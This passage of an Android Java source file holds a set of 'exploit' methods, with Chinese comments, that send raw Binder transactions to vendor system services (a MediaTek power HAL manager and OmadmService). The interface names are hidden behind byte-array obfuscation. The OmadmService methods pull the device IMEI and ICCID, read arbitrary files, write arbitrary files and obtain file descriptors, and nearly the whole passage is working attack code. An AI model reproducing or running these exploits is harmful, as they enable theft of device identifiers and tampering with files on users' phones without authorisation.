            return "[PowerHalMgr] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * PowerHalMgr - mtkPowerHint: 发送电源提示 (transact code=3)
     */
    public static String exploitPowerHalMtkPowerHint(int hint) {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x25, (byte)0x36, (byte)0x17, (byte)0x27, (byte)0x3e, (byte)0x5d, (byte)0x23, (byte)0x3a, (byte)0x4d, (byte)0x2f, (byte)0x30, (byte)0x17, (byte)0x3a, (byte)0x34, (byte)0x4e, (byte)0x2f, (byte)0x29, (byte)0x51, (byte)0x2b, (byte)0x37, (byte)0x17, (byte)0x03, (byte)0x0b, (byte)0x56, (byte)0x3d, (byte)0x3e, (byte)0x4b, (byte)0x02, (byte)0x3a, (byte)0x55, (byte)0x07, (byte)0x3c, (byte)0x4b}, (byte)0x39, (byte)0x4a, (byte)0x5b);
            IBinder binder = getService("power_hal_mgr_service");
            if (binder == null) return "[PowerHalMgr] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeInt(hint);
                boolean ok = binder.transact(3, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[PowerHalMgr] mtkPowerHint(" + hint + ") OK";
                }
                return "[PowerHalMgr] mtkPowerHint transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[PowerHalMgr] mtkPowerHint异常: " + getErrorMsg(e);
        }
    }

    /**
     * PowerHalMgr - setPredictInfo: 设置网络预测信息 (transact code=29)
     */
    public static String exploitPowerHalSetPredictInfo() {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x25, (byte)0x36, (byte)0x17, (byte)0x27, (byte)0x3e, (byte)0x5d, (byte)0x23, (byte)0x3a, (byte)0x4d, (byte)0x2f, (byte)0x30, (byte)0x17, (byte)0x3a, (byte)0x34, (byte)0x4e, (byte)0x2f, (byte)0x29, (byte)0x51, (byte)0x2b, (byte)0x37, (byte)0x17, (byte)0x03, (byte)0x0b, (byte)0x56, (byte)0x3d, (byte)0x3e, (byte)0x4b, (byte)0x02, (byte)0x3a, (byte)0x55, (byte)0x07, (byte)0x3c, (byte)0x4b}, (byte)0x39, (byte)0x4a, (byte)0x5b);
            IBinder binder = getService("power_hal_mgr_service");
            if (binder == null) return "[PowerHalMgr] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeInt(1); // predict enable
                boolean ok = binder.transact(29, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[PowerHalMgr] setPredictInfo OK";
                }
                return "[PowerHalMgr] setPredictInfo transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[PowerHalMgr] setPredictInfo异常: " + getErrorMsg(e);
        }
    }

    /**
     * PowerHalMgr - setPriorityByLinkinfo: 基于链接信息设置优先级 (transact code=30)
     */
    public static String exploitPowerHalSetPriorityByLinkinfo() {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x25, (byte)0x36, (byte)0x17, (byte)0x27, (byte)0x3e, (byte)0x5d, (byte)0x23, (byte)0x3a, (byte)0x4d, (byte)0x2f, (byte)0x30, (byte)0x17, (byte)0x3a, (byte)0x34, (byte)0x4e, (byte)0x2f, (byte)0x29, (byte)0x51, (byte)0x2b, (byte)0x37, (byte)0x17, (byte)0x03, (byte)0x0b, (byte)0x56, (byte)0x3d, (byte)0x3e, (byte)0x4b, (byte)0x02, (byte)0x3a, (byte)0x55, (byte)0x07, (byte)0x3c, (byte)0x4b}, (byte)0x39, (byte)0x4a, (byte)0x5b);
            IBinder binder = getService("power_hal_mgr_service");
            if (binder == null) return "[PowerHalMgr] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeInt(android.os.Process.myUid());
                data.writeString("wlan0");
                boolean ok = binder.transact(30, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[PowerHalMgr] setPriorityByLinkinfo OK";
                }
                return "[PowerHalMgr] setPriorityByLinkinfo transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[PowerHalMgr] setPriorityByLinkinfo异常: " + getErrorMsg(e);
        }
    }

    /**
     * PowerHalMgr - getCpuLoad: 获取CPU负载 (transact code=10)
     */
    public static String exploitPowerHalGetCpuLoad() {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x5a, (byte)0x25, (byte)0x36, (byte)0x17, (byte)0x27, (byte)0x3e, (byte)0x5d, (byte)0x23, (byte)0x3a, (byte)0x4d, (byte)0x2f, (byte)0x30, (byte)0x17, (byte)0x3a, (byte)0x34, (byte)0x4e, (byte)0x2f, (byte)0x29, (byte)0x51, (byte)0x2b, (byte)0x37, (byte)0x17, (byte)0x03, (byte)0x0b, (byte)0x56, (byte)0x3d, (byte)0x3e, (byte)0x4b, (byte)0x02, (byte)0x3a, (byte)0x55, (byte)0x07, (byte)0x3c, (byte)0x4b}, (byte)0x39, (byte)0x4a, (byte)0x5b);
            IBinder binder = getService("power_hal_mgr_service");
            if (binder == null) return "[PowerHalMgr] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(10, data, reply, 0);
                if (ok) {
                    reply.readException();
                    int cpuLoad = reply.readInt();
                    return "[PowerHalMgr] getCpuLoad OK: " + cpuLoad + "%";
                }
                return "[PowerHalMgr] getCpuLoad transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[PowerHalMgr] getCpuLoad异常: " + getErrorMsg(e);
        }
    }

    // ========================================================================
    // 18. OmadmService Expansion - OMA DM扩展
    // ========================================================================

    /**
     * 扫描 OmadmService (omadm/omadm_service)
     */
    public static String detectOmadmService() {
        try {
            String[] names = {
                Obfuscator.dec3(new byte[]{(byte)0x11, (byte)0x62, (byte)0x41, (byte)0x1a, (byte)0x62}, (byte)0x7e, (byte)0x0f, (byte)0x20),
                Obfuscator.dec3(new byte[]{(byte)0x60, (byte)0x4d, (byte)0x50, (byte)0x6b, (byte)0x4d, (byte)0x6e, (byte)0x7c, (byte)0x45, (byte)0x43, (byte)0x79, (byte)0x49, (byte)0x52, (byte)0x6a}, (byte)0x0f, (byte)0x20, (byte)0x31)
            };
            for (String n : names) {
                IBinder b = getService(n);
                if (b != null) {
                    return "[OmadmService] 发现服务: " + n + " -> " + b;
                }
            }
            return "[OmadmService] 未发现服务";
        } catch (Throwable e) {
            return "[OmadmService] detect异常: " + getErrorMsg(e);
        }
    }

    /**
     * OmadmService - getDeviceId: 获取设备ID (IMEI) (transact code=1)
     */
    public static String exploitOmadmGetDeviceId() {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x29, (byte)0x34, (byte)0x01, (byte)0x64, (byte)0x36, (byte)0x09, (byte)0x2e, (byte)0x32, (byte)0x0d, (byte)0x3e, (byte)0x3e, (byte)0x07, (byte)0x64, (byte)0x34, (byte)0x01, (byte)0x2b, (byte)0x3f, (byte)0x01, (byte)0x64, (byte)0x12, (byte)0x23, (byte)0x27, (byte)0x3a, (byte)0x08, (byte)0x27, (byte)0x16, (byte)0x0d, (byte)0x24, (byte)0x3a, (byte)0x0b, (byte)0x2f, (byte)0x29}, (byte)0x4a, (byte)0x5b, (byte)0x6c);
            String svcName = Obfuscator.dec3(new byte[]{(byte)0x11, (byte)0x62, (byte)0x41, (byte)0x1a, (byte)0x62}, (byte)0x7e, (byte)0x0f, (byte)0x20);
            IBinder binder = getService(svcName);
            if (binder == null) return "[OmadmService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(1, data, reply, 0);
                if (ok) {
                    reply.readException();
                    String deviceId = reply.readString();
                    return "[OmadmService] getDeviceId OK: " + (deviceId != null ? deviceId : "null");
                }
                return "[OmadmService] getDeviceId transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[OmadmService] getDeviceId异常: " + getErrorMsg(e);
        }
    }

    /**
     * OmadmService - getIccid: 获取ICCID (transact code=2)
     */
    public static String exploitOmadmGetIccid() {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x29, (byte)0x34, (byte)0x01, (byte)0x64, (byte)0x36, (byte)0x09, (byte)0x2e, (byte)0x32, (byte)0x0d, (byte)0x3e, (byte)0x3e, (byte)0x07, (byte)0x64, (byte)0x34, (byte)0x01, (byte)0x2b, (byte)0x3f, (byte)0x01, (byte)0x64, (byte)0x12, (byte)0x23, (byte)0x27, (byte)0x3a, (byte)0x08, (byte)0x27, (byte)0x16, (byte)0x0d, (byte)0x24, (byte)0x3a, (byte)0x0b, (byte)0x2f, (byte)0x29}, (byte)0x4a, (byte)0x5b, (byte)0x6c);
            IBinder binder = getService("omadm");
            if (binder == null) return "[OmadmService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                boolean ok = binder.transact(2, data, reply, 0);
                if (ok) {
                    reply.readException();
                    String iccid = reply.readString();
                    return "[OmadmService] getIccid OK: " + (iccid != null ? iccid : "null");
                }
                return "[OmadmService] getIccid transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[OmadmService] getIccid异常: " + getErrorMsg(e);
        }
    }

    /**
     * OmadmService - readFile: 读取任意文件 (transact code=3)
     */
    public static String exploitOmadmReadFile(String path) {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x29, (byte)0x34, (byte)0x01, (byte)0x64, (byte)0x36, (byte)0x09, (byte)0x2e, (byte)0x32, (byte)0x0d, (byte)0x3e, (byte)0x3e, (byte)0x07, (byte)0x64, (byte)0x34, (byte)0x01, (byte)0x2b, (byte)0x3f, (byte)0x01, (byte)0x64, (byte)0x12, (byte)0x23, (byte)0x27, (byte)0x3a, (byte)0x08, (byte)0x27, (byte)0x16, (byte)0x0d, (byte)0x24, (byte)0x3a, (byte)0x0b, (byte)0x2f, (byte)0x29}, (byte)0x4a, (byte)0x5b, (byte)0x6c);
            IBinder binder = getService("omadm");
            if (binder == null) return "[OmadmService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(path);
                boolean ok = binder.transact(3, data, reply, 0);
                if (ok) {
                    reply.readException();
                    String content = reply.readString();
                    return "[OmadmService] readFile(" + path + ") OK, 长度=" + (content != null ? content.length() : 0);
                }
                return "[OmadmService] readFile transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[OmadmService] readFile异常: " + getErrorMsg(e);
        }
    }

    /**
     * OmadmService - writeToFile: 任意文件写入 (transact)
     */
    public static String exploitOmadmWriteToFile(String path, String content) {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x29, (byte)0x34, (byte)0x01, (byte)0x64, (byte)0x36, (byte)0x09, (byte)0x2e, (byte)0x32, (byte)0x0d, (byte)0x3e, (byte)0x3e, (byte)0x07, (byte)0x64, (byte)0x34, (byte)0x01, (byte)0x2b, (byte)0x3f, (byte)0x01, (byte)0x64, (byte)0x12, (byte)0x23, (byte)0x27, (byte)0x3a, (byte)0x08, (byte)0x27, (byte)0x16, (byte)0x0d, (byte)0x24, (byte)0x3a, (byte)0x0b, (byte)0x2f, (byte)0x29}, (byte)0x4a, (byte)0x5b, (byte)0x6c);
            IBinder binder = getService("omadm");
            if (binder == null) return "[OmadmService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(path);
                data.writeString(content);
                boolean ok = binder.transact(4, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[OmadmService] writeToFile(" + path + ") OK, 写入长度=" + content.length();
                }
                return "[OmadmService] writeToFile transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[OmadmService] writeToFile异常: " + getErrorMsg(e);
        }
    }

    /**
     * OmadmService - inputStream: 获取文件描述符 (transact)
     */
    public static String exploitOmadmInputStream(String path) {
        try {
            String DESCRIPTOR = Obfuscator.dec3(new byte[]{(byte)0x29, (byte)0x34, (byte)0x01, (byte)0x64, (byte)0x36, (byte)0x09, (byte)0x2e, (byte)0x32, (byte)0x0d, (byte)0x3e, (byte)0x3e, (byte)0x07, (byte)0x64, (byte)0x34, (byte)0x01, (byte)0x2b, (byte)0x3f, (byte)0x01, (byte)0x64, (byte)0x12, (byte)0x23, (byte)0x27, (byte)0x3a, (byte)0x08, (byte)0x27, (byte)0x16, (byte)0x0d, (byte)0x24, (byte)0x3a, (byte)0x0b, (byte)0x2f, (byte)0x29}, (byte)0x4a, (byte)0x5b, (byte)0x6c);
            IBinder binder = getService("omadm");
            if (binder == null) return "[OmadmService] 服务不可用";
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                data.writeString(path);
                boolean ok = binder.transact(5, data, reply, 0);
                if (ok) {
                    reply.readException();
                    return "[OmadmService] inputStream(" + path + ") OK, 文件描述符已获取";
                }
                return "[OmadmService] inputStream transact失败";
            } finally {
                data.recycle();
                reply.recycle();
            }
        } catch (Throwable e) {
            return "[OmadmService] inputStream异常: " + getErrorMsg(e);
        }
    }
}